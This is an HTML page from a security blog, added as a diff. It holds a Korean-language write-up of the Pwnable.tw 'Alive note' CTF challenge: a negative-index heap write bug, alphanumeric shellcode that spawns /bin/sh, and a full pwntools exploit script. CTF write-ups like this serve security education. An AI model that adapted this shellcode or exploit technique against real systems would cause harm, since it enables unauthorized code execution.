@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Pwnable.tw - Alive note | KiraSys</title>
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/header.png)">
+        <div class='av-pic' style="background-image: url(/assets/logo.jpg)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>KiraSys</div>
+        
+            <div>CAT-Security</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+            <a href="/categories/" class="Btn">
+              <li>Categories</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+            
+                <a href="https://github.com/kirasys">
+                    <img src="/assets/github.svg" />
+                </a>
+            
+        
+            
+                <a href="https://www.facebook.com/profile.php?id=100008635065103">
+                    <img src="/assets/facebook.svg" />
+                </a>
+            
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class='ContentView'>
+    <header class='PageTitle'>
+        <h1>Pwnable.tw - Alive note</h1>
+    </header>
+
+    <section>
+      <h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> v1;</span><br><span class="line"></span><br><span class="line">v1 = read_int();</span><br><span class="line"><span class="keyword">if</span> ( v1 &gt; <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound !!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>v1은 int형이라서 음수로 만들어 원하는 곳에 heap 주소를 write 할 수 있고 nx가 꺼져있어서 8byte의 쉘코드를 실행시킬 수 있다.<br><br><br></p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>8byte 만으로 쉘을 실행시키는 것은 힘들어서 힙 공간에 여러 쉘코드 조각들을 올려놓고 jno를 통해 연속적으로 실행하기로 했다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:  52                      push   edx</span><br><span class="line">1:  52                      push   edx</span><br><span class="line">2:  52                      push   edx</span><br><span class="line">3:  54                      push   esp</span><br><span class="line">4:  52                      push   edx</span><br><span class="line">5:  52                      push   edx</span><br><span class="line">6:  52                      push   edx</span><br><span class="line">7:  52                      push   edx</span><br><span class="line">8:  61                      popa</span><br><span class="line">9:  59                      pop    ecx</span><br><span class="line">a:  59                      pop    ecx</span><br><span class="line">b:  52                      push   edx</span><br><span class="line">c:  52                      push   edx</span><br><span class="line">d:  52                      push   edx</span><br><span class="line">e:  68 4e 4e 73 68      push   0x68734e4e</span><br><span class="line">13: 58                      pop    eax</span><br><span class="line">14: 66 35 61 61         xor    ax,0x6161</span><br><span class="line">18: 50                      push   eax</span><br><span class="line">19: 68 4e 62 69 6e      push   0x6e69624e</span><br><span class="line">1e: 58                      pop    eax</span><br><span class="line">1f: 34 61                  xor    al,0x61</span><br><span class="line">21: 50                      push   eax</span><br><span class="line">22: 52                      push   edx</span><br><span class="line">23: 52                      push   edx</span><br><span class="line">24: 52                      push   edx</span><br><span class="line">25: 6a 41                  push   0x41</span><br><span class="line">27: 58                      pop    eax</span><br><span class="line">28: 34 4a                  xor    al,0x4a</span><br><span class="line">2a: 5a                      pop    edx</span><br><span class="line">2b: 4a                      dec    edx</span><br><span class="line">2c: 31 51 42            xor    DWORD PTR [ecx+0x42],edx</span><br><span class="line">2f: 6a 4e                   push   0x4e</span><br><span class="line">31: 5a                      pop    edx</span><br><span class="line">32: 31 51 43            xor    DWORD PTR [ecx+0x43],edx</span><br><span class="line">35: 5a                      pop    edx</span><br><span class="line">36: 59                      pop    ecx</span><br><span class="line">37: 32 31               xor    dh,BYTE PTR [ecx]</span><br></pre></td></tr></table></figure></p>
+<p>만든 alphanumeric 쉘코드는 위와 같다. 우회가 까다로운 부분은 pop ebx와 int 0x80인데 pop ebx는 처음에 popad를 통하여 스택 주소를 넣는 방식으로 우회하였고, int 0x80은 0xff와 xor하는 방식으로 우회하였다. 0xff는 0인 레지스터를 dec하는 방식으로 만들 수 있다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#s = process('/root/alive_note')</span></span><br><span class="line">s = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10300</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> len(name)&lt;<span class="number">8</span>:</span><br><span class="line">		s.sendline(name)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">	<span class="keyword">return</span> s.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellcoding</span><span class="params">(sh,idx=<span class="number">-6</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(sh)&gt;<span class="number">5</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Error"</span></span><br><span class="line">	sh = sh.ljust(<span class="number">5</span>,<span class="string">'\x46'</span>) + <span class="string">'\x71\x39'</span></span><br><span class="line">	add_note(idx,sh)</span><br><span class="line">	add_note(<span class="number">-6</span>,<span class="string">'abcd'</span>)</span><br><span class="line">	add_note(<span class="number">-6</span>,<span class="string">'abcd'</span>)</span><br><span class="line">	add_note(<span class="number">-6</span>,<span class="string">'abcd'</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">shellcoding(<span class="string">'\x52\x52\x52\x54'</span>,<span class="number">-27</span>)</span><br><span class="line">shellcoding(<span class="string">'\x52\x52\x52\x52\x61'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x59\x59\x52\x52\x52'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x68\x4e\x4e\x73\x68'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x58\x66\x35\x61\x61'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x50'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x68\x4e\x62\x69\x6e'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x58\x34\x61\x50\x52'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x52\x52'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x6a\x41\x58\x34\x4a'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x5a\x4a\x31\x51\x42'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x6a\x4e\x5a'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x31\x51\x43'</span>,<span class="number">-5</span>)</span><br><span class="line">shellcoding(<span class="string">'\x5a\x59\x32\x31'</span>)</span><br><span class="line">delete_note(<span class="number">-5</span>)</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><br><br></p>
+<h3 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h3><ul>
+<li>execve system call을 실행시키는 방법대신 read 실행시켜 shellcode를 입력받는 방법을 이용할 수 있다.</li>
+<li>read_int에서 15 byte를 입력받는 것을 이용하여 system(‘/bin/sh’)를 실행시킬 수 있다.</li>
+</ul>
+
+
+      
+
+    </section>
+    
+      <section class='ArticleMeta'>
+          <div>
+            发布于&nbsp;
+            <time datetime="2018-01-28T04:11:23.000Z" itemprop="datePublished">
+              2018-01-28
+            </time>
+          </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2016 - kirasys </div>
+    <div>
+    Powered by Hexo
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
